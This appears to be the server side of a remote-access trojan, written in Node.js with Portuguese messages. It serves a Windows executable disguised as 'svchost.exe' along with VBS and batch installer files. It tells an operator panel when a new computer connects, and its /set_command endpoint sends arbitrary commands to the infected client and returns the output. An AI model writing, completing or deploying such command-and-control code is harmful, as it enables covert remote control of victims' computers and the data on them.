const express = require("express");
const path = require("path");
const router = express.Router();
const WebSocket = require("ws"); // Importante para verificação OPEN

let waitingResolvers = [];
let currentCommand = "";
let commandId = "";
let lastClient = null;

function notifyNewComputer(wsss, computerInfo) {
  const message = {
    type: "new_computer",
    computer: computerInfo
  };

  wsss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN && client.role === "panel") {
      client.send(JSON.stringify(message));
    }
  });
}

function setLastClient(client) {
  lastClient = client;
}

function handleResult(result) {
  while (waitingResolvers.length > 0) {
    const resolve = waitingResolvers.shift();
    resolve(result);
  }
  currentCommand = "";
  commandId = "";
}

router.get("/dist/:arquivo", (req, res) => {
  let filePath;

  switch (req.params.arquivo) {
    case "hihat":
      filePath = path.resolve(__dirname, "../client/svchost.exe");
      return res.download(filePath, "hihat.exe");

    case "launcher":
      filePath = path.resolve(__dirname, "../client/launcher.vbs");
      return res.download(filePath, "launcher.vbs");

    case "install":
      filePath = path.resolve(__dirname, "../client/install.bat");
      return res.download(filePath, "install.bat");

    default:
      return res.status(404).send("Arquivo não encontrado");
  }
});

router.post("/set_command", async (req, res) => {
  const { command } = req.body;
  console.log("[set_command] Recebido:", command);

  if (!command) {
    return res.status(400).json({ error: "Comando não fornecido" });
  }

  if (!lastClient || lastClient.readyState !== 1) {
    return res.status(400).json({ error: "Nenhum cliente conectado" });
  }

  commandId = Date.now().toString();
  currentCommand = command;

  lastClient.send(JSON.stringify({ id: commandId, command }));

  try {
    const result = await new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        reject("timeout");
      }, 30000);

      waitingResolvers.push((output) => {
        clearTimeout(timeout);
        resolve(output);
      });
    });

    res.json({ id: commandId, result });
  } catch (err) {
    res.status(504).json({ error: "Tempo esgotado aguardando resultado" });
  }
});

module.exports = {
  router,
  setLastClient,
  handleResult,
  notifyNewComputer
};
